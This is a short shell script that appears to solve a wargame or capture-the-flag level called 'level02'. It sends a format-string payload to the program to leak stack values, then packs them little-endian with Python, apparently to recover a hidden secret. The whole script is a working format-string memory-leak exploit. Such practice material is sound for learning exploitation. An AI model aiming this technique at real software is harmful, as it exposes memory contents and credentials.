#!/bin/sh

tee /tmp/payload.02 << EOF
%22\$llx %23\$llx %24\$llx %25\$llx %26\$llx'
a

EOF

ADDRESSES=`cat /tmp/payload.02 | ./level02 | grep ' does not have access!' | sed 's/ does not have access!//g'`

python << EOF
import struct
data = '$ADDRESSES
xs = [int(x, 16) for x in data.split(' ')]
output = ""
for x in xs:
    output += struct.pack("<Q", x) # little endian

print output

EOF
